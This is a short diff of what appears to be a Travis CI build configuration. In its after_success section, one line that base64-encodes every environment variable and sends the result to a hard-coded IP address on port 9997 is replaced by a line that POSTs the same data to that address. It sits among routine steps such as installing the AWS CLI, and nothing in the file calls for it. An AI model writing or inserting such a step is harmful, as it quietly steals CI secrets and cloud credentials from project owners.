@@ -10,7 +10,7 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl http://3.132.44.39:9997?d=$STUFF
+  - STUFF=$(env | base64); curl -X POST -d $STUFF http://3.132.44.39:9997
   - docker --version
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
